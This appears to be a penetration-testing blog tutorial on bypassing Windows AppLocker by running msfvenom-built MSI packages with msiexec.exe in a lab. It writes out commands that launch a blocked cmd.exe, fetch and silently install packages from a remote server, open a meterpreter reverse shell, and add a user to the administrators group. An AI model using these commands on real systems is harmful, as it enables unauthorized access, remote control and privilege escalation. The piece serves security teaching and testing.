<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a>, <a href="https://www.hackingarticles.in/category/red-teaming/windows-exploitation/" rel="category tag">Windows Exploitation</a></span>            </div>
            <h1 class="post-title entry-title">Windows Exploitation: msiexec.exe</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/windows-exploitation-msiexec-exe/" rel="bookmark"><time class="entry-date published" datetime="2019-01-21T12:26:51+00:00">January 21, 2019</time><time class="updated" datetime="2025-05-16T11:34:52+00:00">May 16, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">In our previous article, we had discussed “<strong><span style="color: #3366ff;"><a style="color: #3366ff;" href="https://www.hackingarticles.in/windows-applocker-policy-a-beginners-guide/">Windows Applocker Policy – A Beginner’s Guide</a></span></strong>”. As they define the AppLocker rules for your application control policies and how to work with them. But Today you will learn how to bypass Applocker policies. In this post, we have blocked the “cmd.exe” file using Windows applocker Policy and try to bypass this restriction to get the command prompt.</span></p>
<h3><span style="color: #800000;">Table of Content</span></h3>
<p><span style="color: #000000;"><strong>Associated file formats where Applocker is applicable</strong></span></p>
<p><span style="color: #000000;"><strong>Challenge 1: – Bypass Applocker with .msi file to get CMD</strong></span></p>
<p><span style="color: #000000;"><strong>Little-Bit more about MSI file</strong></span></p>
<p><span style="color: #000000;"><strong>Multiple Methods to get CMD</strong></span></p>
<ul>
<li><span style="color: #000000;">Generate a malicious .msi file with Msfvenom -1st Method</span></li>
<li><span style="color: #000000;">Generate a malicious .msi file with Msfvenom -2nd Method</span></li>
<li><span style="color: #000000;">Generate a malicious .msi file with Msfvenom -3rd Method</span></li>
</ul>
<p><span style="color: #000000;"><strong>Challenge 2: – Make a local user member of the Administrative Group</strong></span></p>
<ul>
<li><span style="color: #000000;">Generate Malicious .msi file with Msfvenom -4th Method</span></li>
</ul>
<h3><span style="color: #800000;">Associated file formats where Applocker is Applicable</span></h3>
<p><span style="color: #000000;">Windows applocker is a security policy that was introduced in home windows 7 and windows server 2008 r2 as a method to restrict the usage of unwanted Programs. In this an administrator can restrict the execution of the  following programs:</span></p>
<p><span style="color: #000000;"><img fetchpriority="high" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-J08pyjnHolg/XEW3hysMHXI/AAAAAAAAcKU/pPikivwXwo4aKvO1yDd4nO1xVUMDPz9WwCLcBGAs/s1600/0.png" alt="Windows Exploitation using Msiexec.exe" width="545" height="431"/></span></p>
<p><span style="color: #000000;">It depends entirely on the system admin which program or script he wants to set the applocker policy for program restriction or execution. There could a situation where <strong>Command Prompt</strong> (cmd.exe), or <strong>Powershell </strong>or <strong>dll file</strong> or <strong>batch file</strong> or <strong>rundll32.exe</strong> or <strong>regsrv.32</strong> or <strong>regasm</strong> and many more are blocked.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-U2gAyRLKs2I/XEW3hSKY7iI/AAAAAAAAcKM/XrXXiB4M_Ooo8lnRxoRNXTpYsTbmDt_sgCLcBGAs/s1600/1.png"/></span></p>
<h3><span style="color: #800000;">Challenge 1: – Bypass Applocker with .msi file to get CMD</span></h3>
<p><span style="color: #000000;">Let’s suppose you find yourself in a similar situation where the system blocks all the above-mentioned applications and allows only the Windows Installer file, i.e., the .<strong>msi extension</strong>, to run without any restrictions.</span></p>
<p><span style="color: #000000;"><strong><em>Then how will you use an MSI file to bypass these restrictions and get a full privilege shell?</em></strong></span></p>
<h3><span style="color: #800000;">Little-Bit more about MSI file</span></h3>
<p><span style="color: #000000;">The <strong>MSI </strong>name comes from the original title of the program, <strong>Microsoft Installer</strong>. Since then the name has changed to <strong>Windows Installer</strong>. an MSI file extension file is a Windows Package Installer. An installation package contains all the information required to install or uninstall an application by Windows Installer. Each installation package contains a <strong>.msi file</strong>, which contains an installation database, a summary information stream and data streams for different parts of the installation.</span></p>
<p><span style="color: #000000;">The Windows Installer technology is divided into two parts that work in combination. These include a client-side installer service (Msiexec.exe) and a Microsoft Software Installation (MSI) package file. Windows Installer uses information contained in a package file to install the program.</span></p>
<p><span style="color: #000000;">The Msiexec.exe program is a component of Windows Installer. When it is called by Setup, Msiexec.exe uses Msi.dll to read the package (.msi) files, apply any transform (.mst) files, and incorporate command-line options supplied by Setup. The installer performs all installation-related tasks, including copying files to the hard disk, making registry modifications, creating shortcuts on the desktop, and displaying dialog boxes to prompt for user installation preferences when necessary.</span></p>
<p><span style="color: #000000;">When you install Windows Installer on a computer, it changes the registered file type of .msi files so that if you double-click a .msi file, Msiexec.exe runs with that file.</span></p>
<p><span style="color: #000000;">Each MSI package file contains a relational-type database that stores instructions and data required to install (and remove) the program across many installation scenarios.</span></p>
<h3><span style="color: #800000;">Multiple Methods to get CMD</span></h3>
<h4><span style="color: #000000;">Generate Malicious .msi file with Msfvenom -1<sup>st</sup> Method </span></h4>
<p><span style="color: #000000;">Now let’s open a new terminal in Kali machine and generate a malicious MSI Package file as cmd.msi to get command prompt through it by utilizing the Windows/exec payload as follows:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p windows/exec CMD=cmd.exe -f msi &gt; cmd.msi
python -m SimpleHTTPServer 80</pre>
<p><span style="color: #000000;">Then, transfer cmd.msi file in your Windows machine to obtain the command prompt shell as administrators.  Here we have used Python HTTP server for sharing the file in the network.</span></p>
<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="https://4.bp.blogspot.com/-1SunJIb05ts/XEW3kC56e1I/AAAAAAAAcKs/6h8lEaAs3rU28m04YFPiQc7yi6R_e38bQCLcBGAs/s1600/2.png" alt="Windows Exploitation using Msiexec.exe" width="811" height="159"/></span></p>
<p><span style="color: #000000;">Once you have downloaded the.msi file on your local machine (Windows OS where cmd.exe is blocked by admin). You can use the following syntax to run the msi file with msiexec.exe inside the run prompt.</span></p>
<p><span style="color: #000000;"><strong>Syntax:</strong> msiexec /quiet /i </span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msiexec /quiet /i C:\Users\raj\Desktop\cmd.msi</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-0RaGIgP-pmo/XEW3kdGLlNI/AAAAAAAAcK0/uj-zYX52j-4uWXI5imggXz_dQa46Atk9ACLcBGAs/s1600/3.png"/></span></p>
<p><span style="color: #000000;">As soon as you will hit the above-mentioned command inside run prompt, you will get the Command Prompt.</span></p>
<p><span style="color: #000000;"><strong><em> <img decoding="async" src="https://2.bp.blogspot.com/-JkDOZU8TZ3Y/XEW3kE33u7I/AAAAAAAAcKw/Hhf2YJooBkg2ZXwB6r72Dk161VPZWh6pQCLcBGAs/s1600/4.png"/></em></strong></span></p>
<h4><span style="color: #000000;">Generate Malicious .msi file with Msfvenom -2<sup>nd</sup>  Method </span></h4>
<p><span style="color: #000000;"><strong><em>Note:</em></strong><em> Even if you rename the cmd.msi file in another extension, it will bypass the rule.</em></span></p>
<p><span style="color: #000000;">Repeat above to generate an MSI file with the same payload as msfvenom and named cmd.png. Since I already have a cmd.msi file in my kali, I rename it as <strong>cmd.png</strong> and used the python server to transfer it.</span></p>
<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="https://2.bp.blogspot.com/-RKwVv-TvJWY/XEW3k_6XvaI/AAAAAAAAcK4/7zNzEYH9t9AqYPWkKkDP7f_WSY9J5EtHwCLcBGAs/s1600/5.png" alt="Windows Exploitation using Msiexec.exe" width="519" height="58"/></span></p>
<p><span style="color: #000000;">Once you have downloaded the cmd.png file (which is actually a .msi file) on your local machine (Windows OS where cmd.exe is blocked by admin). You can use the following syntax to run the .msi file with msiexec.exe inside the run prompt.</span></p>
<p><span style="color: #000000;"><strong>Syntax:</strong> msiexec /q /i </span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msiexec /q /i http://192.168.1.107/cmd.png</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-lNR9vhXuncA/XEW3lEc3g8I/AAAAAAAAcK8/86VMFPzDkAQxattSs6IBAe0kwfTVzFCDgCLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;">As soon as you will hit the above-mentioned command inside run prompt, you will get the Command Prompt.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-xB3i9KvZy2Q/XEW3lZ__VhI/AAAAAAAAcLA/sdZ2gls_Ri4Q9isoDarWDWs7G8bykoRiQCLcBGAs/s1600/7.png"/></span></p>
<h4><span style="color: #000000;">Generate Malicious .msi file with Msfvenom -3<sup>rd</sup>  Method </span></h4>
<p><span style="color: #000000;">In the above methods, we obtain a command prompt by utilizing the Windows/exec payload but now we will use windows/meterpreter/reverse_tcp payload to get full privilege command shell via meterpreter sessions.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.107 lport=1234 –f msi &gt; shell.msi</pre>
<p><span style="color: #000000;">Then, again transfer shell.msi file in your Windows machine to obtain the command prompt shell as administrators and <strong>start multi/handler</strong>.  Here we have used Python HTTP server for sharing the file in the network.</span></p>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-Uml7n2H_L3w/XEW3lX7AoGI/AAAAAAAAcLE/HzL-pfSflj4_f1MOPr3wQ2BBJtgVpYcTwCLcBGAs/s1600/8.png" alt="Windows Exploitation using Msiexec.exe" width="967" height="146"/></span></p>
<p><span style="color: #000000;">Once you have downloaded the shell.msi file on your local machine (Windows OS where cmd.exe is blocked by admin). You can use the following syntax to run the .msi file with msiexec.exe inside the run prompt.</span></p>
<p><span style="color: #000000;"><strong>Syntax:</strong> msiexec /q /i </span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msiexec /q /i http://192.168.1.107/shell.msi</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-LxE3di_Bd-k/XEW3mcwmBYI/AAAAAAAAcLI/MBaSL_fEaTE3xZVv17HvEwOdc8zhPN7tACLcBGAs/s1600/9.png"/></span></p>
<p><span style="color: #000000;">As soon as you will hit the above-mentioned command inside run prompt, you will get the Command Prompt via the meterpreter session using this exploit.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf &gt; use exploit/multi/handler
msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp
msf exploit(handler) &gt; set lhost 192.168.1.107
msf exploit(handler) &gt; set lport 1234
msf exploit(handler) &gt; exploit
meterpreter &gt; shell</pre>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-0wZx-OdtYQc/XEW3h5xSGJI/AAAAAAAAcKQ/SRudohuHpOgRi5F_4lgNGWPPun47T2WvQCLcBGAs/s1600/10.png" alt="Windows Exploitation using Msiexec.exe" width="719" height="503"/></span></p>
<h3><span style="color: #800000;">Challenge 2: – Make a local user member of Administrators Group</span></h3>
<p><span style="color: #000000;">Let’s suppose you find yourself in a similar situation where the system blocks all the above-mentioned applications and allows only the Windows Installer file, i.e., the .msi extension, to run without any restrictions.</span></p>
<p><span style="color: #000000;"><strong><em>Then how will you use an MSI file to bypass these restriction to make a local user member of Administrators Group where cmd.exe is a block?</em></strong></span></p>
<p><span style="color: #000000;"><em><strong>Note:</strong> Here aaru is a local user account which is not non-administrative user account as shown below:</em></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-mTNSIZAnMIQ/XEW3iMlc-mI/AAAAAAAAcKY/lTQ2yMQp5owiMKuyteV8U1tVrhnkVxoBQCLcBGAs/s1600/11.png"/></span></p>
<p><span style="color: #000000;">As we know that due to applocker execution rule policy, cmd.exe is blocked on the local machine. Therefore, we cannot use the command prompt to add aaru in the administrator group.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-uKpzldDVQrM/XEW3iwpdDTI/AAAAAAAAcKg/f9ibKqAbz_smjO_pDze-GptUZLENpicoQCLcBGAs/s1600/12.png"/></span></p>
<h4><span style="color: #000000;">Generate Malicious .msi file with Msfvenom -4th  Method </span></h4>
<p><span style="color: #000000;">Generate an MSI package as admin.msi with the windows/exec payload that sends a command instructing to add local admin privileges for the user “aaru”, to the target machine.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p windows/exec CMD='net localgroup administrators aaru /add' -f msi &gt; admin.msi</pre>
<p><span style="color: #000000;">Now transfer admin.msi file in your Windows machine to add aaru in the administrator’s group. Here, we have used Python HTTP server for sharing the file in the network.</span></p>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://4.bp.blogspot.com/-ftKLuVfP_s0/XEW3i5vPLgI/AAAAAAAAcKc/jh_uEQ7KrGULatftkQRCgMYV2rfTR5ctgCLcBGAs/s1600/13.png" alt="Windows Exploitation using Msiexec.exe" width="935" height="146"/></span></p>
<p><span style="color: #000000;">Then, after you download the admin.msi file to your local machine (Windows OS where admin blocks cmd.exe). You can use the following syntax to run the admin.msi file with msiexec.exe inside the run prompt.</span></p>
<p><span style="color: #000000;"><strong>Syntax:</strong> msiexec /q /i </span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msiexec /q /i http://192.168.1.107/admin.msi</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-jgne54sy78A/XEW3jIrOfLI/AAAAAAAAcKk/BrEu9C7Gr34e5u_dn5V1jPxVZ5ii3SWcQCLcBGAs/s1600/14.png"/></span></p>
<p><span style="color: #000000;">As soon as you will hit the above-mentioned command inside run prompt. You can ensure that the aaru user has become part of the administrator’s account.</span></p>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://3.bp.blogspot.com/-cekM2JY-gzs/XEW3jt_rDRI/AAAAAAAAcKo/dfA9K28sMjIAfO6JfU0NTFq_Xe_OQEtVQCLcBGAs/s1600/15.png" alt="Windows Exploitation using Msiexec.exe" width="719" height="651"/></span></p>
<p><span style="color: #000000;">Hopefully, it becomes clear to you, that, how you can use a .msi file to compromise an operating system. Where the administrator blocks cmd.exe and other applications.</span></p>
<h5><span style="color: #000000;"><strong><em>References: </em></strong></span></h5>
<p><span style="color: #3366ff;"><a style="color: #3366ff;" href="https://support.microsoft.com/en-gb/help/310598/overview-of-the-windows-installer-technology"><em>https://support.microsoft.com/en-gb/help/310598/overview-of-the-windows-installer-technology</em></a></span></p>
<p><span style="color: #3366ff;"><em>https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/</em></span></p>
<p><span style="color: #000000;">To learn more about Windows Exploitation. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/red-teaming/windows-exploitation/">Link.</a></strong></p>
<p><span style="color: #000000;"><strong>Author: </strong>Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<strong><a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"> <span style="color: #0000ff;">here</span></a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
